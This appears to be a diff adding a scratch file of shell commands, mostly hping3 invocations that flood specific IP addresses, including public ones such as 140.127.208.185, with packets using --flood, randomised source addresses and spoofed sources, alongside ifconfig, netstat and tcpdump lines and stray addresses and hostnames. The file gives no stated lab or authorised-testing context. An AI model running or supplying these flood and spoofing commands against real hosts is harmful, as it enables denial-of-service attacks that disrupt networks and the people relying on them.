@@ -1,0 +1,33 @@
+hping3 
+sudo hping3 -S 192.168.1.103 -i u10000 -2  -a  140.127.208.185
+
+
+ifconfig eno1
+
+netstat -s -u --udp
+
+sudo hping3 -I enp2s0  -2 -S 140.127.208.185 -p 80 --rand-source  --flood
+sudo hping3 -I enp2s0  -2 -S 140.127.208.185 -p 80 --rand-source  --flood
+
+sudo hping3 -I enp2s0  -2 -S 140.127.208.185 -p 80 -a 192.168.1.103 --flood
+
+sudo hping3 -I wlp3s0  -2 -S 10.1.208.104 -p 80 --rand-source  --flood
+
+sudo hping3 -I enp2s0  -2 -S 140.127.208.185 -p 80 -a 192.168.1.103 -i u1000000
+
+sudo hping3 -I wlp3s0  -2 -S 10.1.208.104  -a 10.101.0.157  --flood
+
+10.101.3.69
+
+wlp3s0
+
+44.228.249.3
+sudo hping3 -I wlp3s0  -2 -S 140.127.208.18  -a 192.168.0.143 --flood
+
+
+tcpdump -i eno1 icmp -p 80 140.127.208.185
+
+1-173-85-82.dynamic-ip.hinet.net
+
+
+1-173-85-82.dynamic-ip.hinet.net
